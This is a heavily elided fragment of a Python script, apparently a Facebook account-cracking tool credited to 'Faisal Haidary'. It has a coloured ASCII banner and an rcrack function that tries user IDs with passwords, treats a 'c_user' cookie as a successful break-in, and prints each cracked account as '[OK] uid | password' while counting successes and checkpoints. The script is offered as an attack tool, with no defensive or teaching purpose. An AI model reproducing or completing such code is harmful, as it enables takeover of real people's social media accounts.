...
\t\x1b[1;92m| $$_____/      |__/                    | $$
\t\x1b[1;97m| $$    /$$$$$$  /$$  /$$$$$$$  /$$$$$$ | $$
\t\x1b[1;92m| $$$$$|____  $$| $$ /$$_____/ |____  $$| $$
\t\x1b[1;97m| $$__/ /$$$$$$$| $$|  $$$$$$   /$$$$$$$| $$
\t\x1b[1;92m| $$   /$$__  $$| $$ \____  $$ /$$__  $$| $$
\t\x1b[1;97m| $$  |  $$$$$$$| $$ /$$$$$$$/|  $$$$$$$| $$
\t\x1b[1;92m|__/   \_______/|__/|_______/  \_______/|__/
                                            
                                            
                                            
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
---------------------------------------------------------------------------------------------------------
 Author By : Faisal Haidary 

\x1b[1;97m Facebook : FREE COMMANDS DECODE BY Faisal ⬛🟥🟩

\x1b[1;97m Group : DECODE BY Faisal OR TECH TEAM⬛🟥🟩
...
def rcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[Faisal🇦🇫-OK] '+cid+' | '+ps)
		...
		sys.stdout.write(f"\r \x1b[1;32m[ F A I S A L]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
